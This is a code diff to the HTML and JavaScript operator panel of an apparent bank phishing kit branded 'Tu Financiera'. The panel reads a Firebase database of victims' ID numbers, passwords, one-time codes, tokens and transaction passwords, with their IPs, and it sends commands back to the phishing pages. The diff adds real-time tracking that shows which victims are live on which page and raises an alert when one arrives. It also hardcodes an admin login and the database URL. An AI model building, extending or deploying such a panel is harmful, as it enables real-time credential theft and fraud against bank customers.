@@ -8,17 +8,9 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
 <style>
 :root{
-  --verde:#8dc63f;
-  --verde-osc:#6aa62c;
-  --verde-suave:#f2f9e8;
-  --azul:#0574af;
-  --rojo:#c8102e;
-  --rojo-suave:#fdf0f2;
-  --bg:#eef1f5;
-  --linea:#e1e5eb;
-  --linea-fuerte:#cfd6df;
-  --txt:#1c2530;
-  --muted:#6c7886;
+  --verde:#8dc63f;--verde-osc:#6aa62c;--verde-suave:#f2f9e8;
+  --azul:#0574af;--rojo:#c8102e;--rojo-suave:#fdf0f2;
+  --bg:#eef1f5;--linea:#e1e5eb;--linea-fuerte:#cfd6df;--txt:#1c2530;--muted:#6c7886;
   --sombra:0 1px 2px rgba(16,24,40,.05), 0 6px 18px rgba(16,24,40,.06);
 }
 *{margin:0;padding:0;box-sizing:border-box}
@@ -34,7 +26,6 @@ body{background:var(--bg);color:var(--txt);font-family:'Inter',sans-serif;font-s
 #login input{width:100%;border:1.5px solid var(--linea);border-radius:8px;padding:11px 13px;font-family:inherit;font-size:14px;margin-bottom:15px;outline:none;color:var(--txt)}
 #login input:focus{border-color:var(--verde);box-shadow:0 0 0 3px rgba(141,198,63,.18)}
 #login button{width:100%;background:var(--verde);color:#fff;border:0;border-radius:8px;padding:12px;font-family:inherit;font-weight:700;font-size:13.5px;cursor:pointer}
-#login button:hover{background:var(--verde-osc)}
 #login .err{display:none;background:var(--rojo-suave);border:1px solid #f2c4cc;color:#96122a;font-size:12px;padding:9px;border-radius:7px;margin-bottom:14px;text-align:center}
 
 header{position:sticky;top:0;z-index:60;background:#fff;border-bottom:3px solid var(--verde);box-shadow:var(--sombra)}
@@ -50,7 +41,9 @@ header{position:sticky;top:0;z-index:60;background:#fff;border-bottom:3px solid 
 .st{background:#f8fafc;border:1px solid var(--linea);border-radius:9px;padding:7px 14px;min-width:70px;text-align:center}
 .st b{display:block;font-size:17px;font-weight:800;font-family:'JetBrains Mono',monospace;line-height:1.1}
 .st span{font-size:8.5px;font-weight:700;letter-spacing:.8px;color:var(--muted);text-transform:uppercase}
-.st.g b{color:var(--verde-osc)} .st.b b{color:var(--azul)} .st.v b{color:#7c3aed} .st.r b{color:var(--rojo)}
+.st.g b{color:var(--verde-osc)}.st.b b{color:var(--azul)}.st.v b{color:#7c3aed}.st.r b{color:var(--rojo)}
+.st.live{border-color:#bfe3a3;background:#f4fbe9}
+.st.live b{color:var(--verde-osc)}
 .hacc{display:flex;gap:7px;margin-left:8px}
 .herr{display:none;background:var(--rojo-suave);border-bottom:1px solid #f2c4cc;color:#96122a;font-size:11.5px;padding:8px 22px;font-weight:600}
 
@@ -62,7 +55,6 @@ header{position:sticky;top:0;z-index:60;background:#fff;border-bottom:3px solid 
 .tab.alt.on{background:var(--azul);border-color:var(--azul)}
 .buscar{margin-left:auto;position:relative}
 .buscar input{width:280px;border:1px solid var(--linea-fuerte);border-radius:20px;padding:8px 14px 8px 33px;font-family:inherit;font-size:12px;outline:none;color:var(--txt);background:#fbfcfd}
-.buscar input:focus{border-color:var(--azul);background:#fff}
 .buscar svg{position:absolute;left:11px;top:50%;transform:translateY(-50%);width:13px;height:13px;stroke:var(--muted);fill:none;stroke-width:2.5}
 .btn{font-family:inherit;font-size:10px;font-weight:800;letter-spacing:.6px;text-transform:uppercase;padding:8px 13px;border-radius:7px;cursor:pointer;border:1px solid var(--linea-fuerte);background:#fff;color:var(--txt)}
 .btn:hover{border-color:var(--azul);color:var(--azul)}
@@ -71,15 +63,22 @@ header{position:sticky;top:0;z-index:60;background:#fff;border-bottom:3px solid 
 
 main{padding:16px 22px 70px}
 .tabla{background:#fff;border:1px solid var(--linea);border-radius:11px;overflow-x:auto;box-shadow:var(--sombra)}
-table{width:100%;border-collapse:collapse;min-width:1150px}
+table{width:100%;border-collapse:collapse;min-width:1220px}
 thead th{background:#f7f9fb;text-align:left;font-size:8.5px;font-weight:800;letter-spacing:.9px;text-transform:uppercase;color:var(--muted);padding:10px 8px;border-bottom:1px solid var(--linea);white-space:nowrap}
 tbody td{padding:8px;border-bottom:1px solid #f0f3f6;font-size:11px;vertical-align:middle}
 tbody tr:hover{background:#fafcfe}
 tbody tr:last-child td{border-bottom:0}
 tr.nuevo td:first-child{box-shadow:inset 3px 0 0 var(--verde)}
+tr.vivo{background:#f6fbf1}
 tr.dato{background:#f6fbf1}
 tr.reenvio{background:#eff8fd}
 tr.oculto{opacity:.5}
+
+.vivo{display:flex;align-items:center;gap:5px;font-size:8.5px;font-weight:800;letter-spacing:.4px;text-transform:uppercase;white-space:nowrap}
+.vivo .pt{width:8px;height:8px;border-radius:50%;background:#b9c2cc;flex:0 0 8px}
+.vivo.on{color:var(--verde-osc)}
+.vivo.on .pt{background:var(--verde);box-shadow:0 0 0 0 rgba(141,198,63,.7);animation:latir 1.6s infinite}
+@keyframes latir{0%{box-shadow:0 0 0 0 rgba(141,198,63,.7)}70%{box-shadow:0 0 0 7px rgba(141,198,63,0)}100%{box-shadow:0 0 0 0 rgba(141,198,63,0)}}
 
 .chip{display:inline-block;font-size:8.5px;font-weight:800;padding:3px 7px;border-radius:5px;letter-spacing:.4px;text-transform:uppercase;white-space:nowrap}
 .chip.CLAVE{background:#eaf2fb;color:#1d4f7c}
@@ -97,6 +96,7 @@ tr.oculto{opacity:.5}
 .ip .ubi{display:block;color:var(--muted);font-size:9px;font-family:'Inter',sans-serif}
 .ip.bloq{color:var(--rojo);font-weight:700}
 .tiempo{font-size:9.5px;color:var(--muted);white-space:nowrap}
+.pag{font-size:9px;color:var(--muted);font-family:'JetBrains Mono',monospace}
 .acc{display:flex;gap:3px;flex-wrap:wrap;max-width:250px}
 .b{padding:4px 6px;border-radius:4px;border:1px solid transparent;font-family:inherit;font-size:7.5px;font-weight:800;text-transform:uppercase;letter-spacing:.3px;cursor:pointer;white-space:nowrap}
 .b:hover{opacity:.82}
@@ -145,9 +145,9 @@ tr.oculto{opacity:.5}
       <div class="marca"><div class="esc">T</div><div><b>Panel Tu Financiera</b><span>Control de accesos</span></div></div>
       <span class="conn" id="conn">En línea</span>
       <div class="stats">
+        <div class="st live"><b id="stVivo">0</b><span>En vivo</span></div>
         <div class="st"><b id="stTotal">0</b><span>Total</span></div>
         <div class="st g"><b id="stProc">0</b><span>En curso</span></div>
-        <div class="st v"><b id="stDatos">0</b><span>Datos</span></div>
         <div class="st b"><b id="stFin">0</b><span>Final</span></div>
         <div class="st r"><b id="stRec">0</b><span>Rechaz</span></div>
       </div>
@@ -161,7 +161,7 @@ tr.oculto{opacity:.5}
     <div class="toolbar">
       <div class="tabs" id="tabs">
         <button class="tab on" data-f="todos">Todos</button>
-        <button class="tab alt" data-f="datos">Con datos</button>
+        <button class="tab alt" data-f="vivo">En vivo</button>
         <button class="tab alt" data-f="codigo">Códigos</button>
         <button class="tab alt" data-f="token">Tokens</button>
         <button class="tab alt" data-f="clave">Clave trans.</button>
@@ -184,6 +184,7 @@ tr.oculto{opacity:.5}
 (function(){
   var DB = "https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
   var ADMIN_USER = "Ghost", ADMIN_PASS = "Cabimas01.";
+  var VIVO_MS = 15000;
 
   var datos = {usuarios:{}, comandos:{}};
   var anterior = {}, ocultos = {}, bloqueadas = {};
@@ -197,18 +198,14 @@ tr.oculto{opacity:.5}
     if(document.getElementById('usuario').value.trim() === ADMIN_USER && document.getElementById('clave').value === ADMIN_PASS){
       try{ sessionStorage.setItem('auth_panel_tufi','true'); }catch(x){}
       abrir();
-    } else {
-      loginErr.textContent = 'Usuario o clave incorrectos';
-      loginErr.style.display = 'block';
-    }
+    } else { loginErr.textContent = 'Usuario o clave incorrectos'; loginErr.style.display = 'block'; }
   }
 
   function abrir(){
     document.getElementById('login').style.display = 'none';
     document.getElementById('panel').style.display = 'block';
-    activo = true;
-    cargarBloqueos();
-    ciclo();
+    activo = true; cargarBloqueos(); ciclo();
+    setInterval(function(){ if(activo) render(); }, 5000);
   }
 
   document.getElementById('salir').addEventListener('click', function(){
@@ -281,6 +278,9 @@ tr.oculto{opacity:.5}
       var d = u[id] || {}, a = anterior[id] || {};
       if(a.clave === undefined) return;
       var quien = d.usuario || d.cedula || id;
+      if(a.ultimoPing && d.ultimoPing && d.ultimoPing > a.ultimoPing + 1000 && Date.now() - d.ultimoPing < 12000){
+        if(a.ultimoPing && Date.now() - a.ultimoPing > VIVO_MS) alertar('ENTRÓ A LA PÁGINA', quien + ' · ' + (d.pagina || ''), 'c');
+      }
       if(d.clave && d.clave !== a.clave){ beep(760,.09); alertar('Clave de acceso', quien + ' → ' + d.clave); }
       if(d.codigo && d.codigo !== a.codigo){ beep(900,.12); alertar('Código recibido', quien + ' → ' + d.codigo); }
       if(d.codigo2 && d.codigo2 !== a.codigo2){ beep(1050,.12); alertar('Segundo código', quien + ' → ' + d.codigo2, 'b'); }
@@ -294,6 +294,7 @@ tr.oculto{opacity:.5}
   }
 
   function esc(s){ return String(s===undefined||s===null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+  function vivo(d){ return d.ultimoPing && (Date.now() - d.ultimoPing) < VIVO_MS; }
 
   function hace(ts){
     if(!ts) return '—';
@@ -316,7 +317,7 @@ tr.oculto{opacity:.5}
   function pasa(d){
     var e = String(d.estado||'').toUpperCase();
     if(tab === 'todos') return true;
-    if(tab === 'datos') return !!(d.clave);
+    if(tab === 'vivo') return vivo(d);
     if(tab === 'codigo') return e.indexOf('CODIGO') !== -1;
     if(tab === 'token') return e.indexOf('TOKEN') !== -1;
     if(tab === 'clave') return e.indexOf('TRANSACCIONAL') !== -1 || e === 'AUTORIZANDO';
@@ -334,7 +335,7 @@ tr.oculto{opacity:.5}
 
   function render(){
     var cont = document.getElementById('tabla');
-    var lista = [], total=0, proc=0, dat=0, fin=0, rec=0;
+    var lista = [], total=0, proc=0, fin=0, rec=0, enVivo=0;
 
     Object.keys(datos.usuarios).forEach(function(id){
       var d = datos.usuarios[id] || {};
@@ -345,13 +346,13 @@ tr.oculto{opacity:.5}
       if(e === 'FINALIZADO') fin++;
       else if(e === 'RECHAZADO') rec++;
       else proc++;
-      if(d.clave) dat++;
+      if(vivo(d)) enVivo++;
       if(pasa(d) && busca(d, id)) lista.push({id:id, d:d});
     });
 
+    document.getElementById('stVivo').textContent = enVivo;
     document.getElementById('stTotal').textContent = total;
     document.getElementById('stProc').textContent = proc;
-    document.getElementById('stDatos').textContent = dat;
     document.getElementById('stFin').textContent = fin;
     document.getElementById('stRec').textContent = rec;
 
@@ -360,11 +361,15 @@ tr.oculto{opacity:.5}
       return;
     }
 
-    lista.sort(function(a,b){ return (b.d.ts||0)-(a.d.ts||0); });
+    lista.sort(function(a,b){
+      var va = vivo(a.d) ? 1 : 0, vb = vivo(b.d) ? 1 : 0;
+      if(va !== vb) return vb - va;
+      return (b.d.ts||0)-(a.d.ts||0);
+    });
 
     var h = '<table><thead><tr>'
-      + '<th>Estado</th><th>Documento</th><th>Clave</th><th>Cód. 1</th><th>Cód. 2</th>'
-      + '<th>Token 1</th><th>Token 2</th><th>Clave trans.</th><th>Reenv</th><th>IP</th><th>Último</th><th>Acciones</th>'
+      + '<th>En vivo</th><th>Estado</th><th>Documento</th><th>Clave</th><th>Cód. 1</th><th>Cód. 2</th>'
+      + '<th>Token 1</th><th>Token 2</th><th>Clave trans.</th><th>Reenv</th><th>Página</th><th>IP</th><th>Último</th><th>Acciones</th>'
       + '</tr></thead><tbody>';
 
     lista.forEach(function(it){
@@ -372,7 +377,9 @@ tr.oculto{opacity:.5}
       var e = String(d.estado||'').toUpperCase();
       var ip = d.ip && d.ip !== 'unknown' ? d.ip : '';
       var bl = ip && bloqueadas[ip];
+      var esVivo = vivo(d);
       var cl = '';
+      if(esVivo) cl += ' vivo';
       if(d.ts && Date.now()-d.ts < 120000) cl += ' nuevo';
       if(d.clave) cl += ' dato';
       if((d.reenvio && Date.now()-d.reenvio < 60000) || (d.reenvio2 && Date.now()-d.reenvio2 < 60000)) cl += ' reenvio';
@@ -383,6 +390,7 @@ tr.oculto{opacity:.5}
       }
 
       h += '<tr class="' + cl + '" data-id="' + id + '">'
+        + '<td><span class="vivo ' + (esVivo?'on':'') + '"><span class="pt"></span>' + (esVivo?'En vivo':'Salió') + '</span></td>'
         + '<td><span class="chip ' + chip(e) + '">' + esc(e||'—') + '</span></td>'
         + '<td class="mono">' + esc(d.cedula||d.documento||'—') + '</td>'
         + '<td class="cred">' + esc(d.clave||'—') + '</td>'
@@ -392,6 +400,7 @@ tr.oculto{opacity:.5}
         + '<td>' + cel(d.token2,'p') + '</td>'
         + '<td>' + cel(d.clave_transaccional,'p') + '</td>'
         + '<td class="mono">' + ((d.reenvios||0)+(d.reenvios2||0)) + '</td>'
+        + '<td class="pag">' + esc(d.pagina||'—') + '</td>'
         + '<td class="ip ' + (bl?'bloq':'') + '">' + esc(ip||'N/A') + (bl?' BLOQ':'') + '<span class="ubi">' + esc(d.ubicacion||'') + '</span></td>'
         + '<td class="tiempo">' + hace(d.ultimoPing||d.ts) + '</td>'
         + '<td><div class="acc">'
@@ -431,14 +440,12 @@ tr.oculto{opacity:.5}
       fetch(DB+'/ips_bloqueados/'+ip.replace(/\./g,'_')+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:ip,fecha:Date.now()})}).catch(function(){});
       bloqueadas[ip] = true; render(); return;
     }
-
     if(a === 'rechazar'){
       var t = b.getAttribute('data-t');
       fetch(DB+'/comandos/'+id+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},
         body:JSON.stringify({accion:'rechazar', rechazo:t, ts:Date.now()})}).catch(function(){});
       beep(420,.08); return;
     }
-
     fetch(DB+'/comandos/'+id+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({accion:a, rechazo:'', ts:Date.now()})}).catch(function(){});
     beep(500,.06);
